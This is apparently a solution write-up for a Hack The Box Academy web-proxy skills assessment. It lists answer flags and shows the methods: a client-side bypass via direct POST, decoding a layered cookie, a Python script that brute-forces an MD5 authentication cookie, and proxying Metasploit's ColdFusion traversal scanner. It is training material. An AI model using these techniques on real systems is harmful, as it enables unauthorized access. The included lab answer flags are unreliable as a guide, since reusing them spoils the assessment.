# Section 15 — Skills Assessment

> Four scenarios testing all major proxy techniques from the module.
> Target: http://TARGET_IP:PORT

---

## Answers

| Q | Scenario | Answer |
|---|----------|--------|
| 1 | Enable disabled button on /lucky.php and click it | `HTB{d154bl3d_bu770n5_w0n7_570p_m3}` |
| 2 | Decode the multi-encoded cookie on /admin.php (31 chars) | `3dac93b8cd250aa8c1a36fffc79a17a` |
| 3 | Fuzz last character of the 31-char MD5 hash | `HTB{burp_1n7rud3r_n1nj4!}` |
| 4 | Capture coldfusion_locale_traversal request, find the XXXXX directory | `CFIDE` |

---

## Q1 — Disabled Button (`/lucky.php`)

**Technique:** Intercept the response and remove `disabled` from the button, OR POST directly bypassing client-side validation.

**The form:**
```html
<form method='post'>
  <button name='getflag' value='true' disabled>...</button>
</form>
```

**Method 1 — Direct POST (fastest):**
```bash
curl -s -X POST http://TARGET/lucky.php -d "getflag=true"
# The server doesn't check whether the button was disabled — that's client-side only
```

**Method 2 — Response interception (what the section teaches):**
```
Burp: Proxy → Proxy Settings → Response Modification Rules → Enable disabled form fields
ZAP HUD: click the lightbulb (Show/Enable) button on the left pane
Then: intercept response, change: disabled → (delete the word)
```

---

## Q2 — Multi-Encoded Cookie (`/admin.php`)

**Technique:** Iteratively decode until you reach the final value.

```bash
# Get the cookie:
curl -sv http://TARGET/admin.php 2>&1 | grep "Set-Cookie"
# cookie=4d325268597a6b7a596a686a5a4449314d4746684f474d7859544d325a6d5a6d597a63355954453359513d3d
```

**Encoding chain: Hex → Base64 → plaintext**

```python
import base64

s = "4d325268597a6b7a596a686a5a4449314d4746684f474d7859544d325a6d5a6d597a63355954453359513d3d"

# Step 1: Hex decode
step1 = bytes.fromhex(s).decode()
# → M2RhYzkzYjhjZDI1MGFhOGMxYTM2ZmZmYzc5YTE3YQ==

# Step 2: Base64 decode
step2 = base64.b64decode(step1).decode()
# → 3dac93b8cd250aa8c1a36fffc79a17a  (31 chars)

print(step2)  # Q2 answer
```

**Quick decode one-liner:**
```bash
echo "4d325268597a6b7a..." | xxd -r -p | base64 -d
# Output: 3dac93b8cd250aa8c1a36fffc79a17a
```

---

## Q3 — Fuzz the Last MD5 Character

**Setup:** The cookie = 31-char MD5 hash missing its last character. The server checks the full 32-char MD5 as authentication. Try all alphanumeric characters (a-z, 0-9) for the last position, re-encode each as base64 → hex before sending.

**Encoding for each request: plaintext → base64 → hex**

```python
import base64, subprocess, string

base_hash = "3dac93b8cd250aa8c1a36fffc79a17a"

for c in string.ascii_lowercase + string.digits:
    full_hash = base_hash + c
    # Re-encode to match the original cookie format
    b64 = base64.b64encode(full_hash.encode()).decode()
    hex_encoded = b64.encode().hex()
    
    resp = subprocess.run(
        ['curl', '-s', '-b', f'cookie={hex_encoded}', 'http://TARGET/admin.php'],
        capture_output=True, text=True).stdout
    
    if 'HTB{' in resp:
        print(f"char='{c}', hash={full_hash}")
        break
```

**Result:** char = `d`, full hash = `3dac93b8cd250aa8c1a36fffc79a17ad`

**Burp Intruder / ZAP Fuzzer equivalent:**
```
1. Capture request to /admin.php in Proxy History
2. Send to Intruder (Ctrl+I)
3. Mark the last character of the cookie value as payload position
4. Payload: Simple List → load alphanum-case.txt
5. Payload Processing: Add two rules in order:
   → Base64 Encode (of the full hash + payload char)
   → Actually easier: just use the script approach above
```

Note: The encoding chain (base64 → hex) means each payload needs to go through two encoding steps before being sent. The script handles this more reliably than Intruder payload processors.

---

## Q4 — Proxying Metasploit (`coldfusion_locale_traversal`)

**Technique:** Route MSF through Burp to capture the exact request.

```bash
# In msfconsole:
use auxiliary/scanner/http/coldfusion_locale_traversal
set PROXIES HTTP:127.0.0.1:8080
set RHOSTS TARGET_IP
set RPORT TARGET_PORT
run
```

**The module sends requests to:** `/CFIDE/administrator/..`

The ColdFusion admin panel lives at `/CFIDE/administrator/index.cfm`. The traversal vulnerability in CVE-2010-2861 uses this path to bypass authentication.

**Q4 answer:** `CFIDE`

**Finding it without running MSF (read the source):**
```bash
grep -i "uri\|CFIDE" /usr/share/metasploit-framework/modules/auxiliary/scanner/http/coldfusion_locale_traversal.rb
# Shows: url = '/CFIDE/administrator/index.cfm'
```

---

## Key Techniques Summary

| Q | Technique | Tool |
|---|-----------|------|
| 1 | Response interception → remove `disabled` OR POST directly | Burp/ZAP/curl |
| 2 | Multi-layer decoding (hex → base64) | Python/Burp Decoder/ZAP E-D-H |
| 3 | Fuzzing with payload processing (encode before send) | Python script/Burp Intruder |
| 4 | Proxying MSF to capture request | proxychains/MSF PROXIES |
